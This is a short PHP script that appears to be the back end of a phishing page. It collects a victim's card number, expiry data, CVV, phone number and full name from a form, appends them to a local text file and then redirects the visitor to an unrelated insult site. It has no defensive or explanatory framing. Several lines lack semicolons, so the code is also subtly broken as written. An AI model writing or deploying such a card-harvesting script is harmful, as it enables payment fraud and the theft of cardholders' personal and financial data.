<?PHP

$Number = $_POST['cardnumber'];

$Data = $_POST['carddata'];

$Cvv = $_POST['cardcvv']

$Phone = $_POST['phone']

$Name = $_POST['fullname']

$log = fopen("database.txt","at");

fwrite($log,"\n $Number:$Data:$Cvv:$Phone:$Name \n");

fclose($log);

echo "<html><head><META HTTP-EQUIV='Refresh' content ='0; URL=https://natribu.org/'></head></html>";

?>
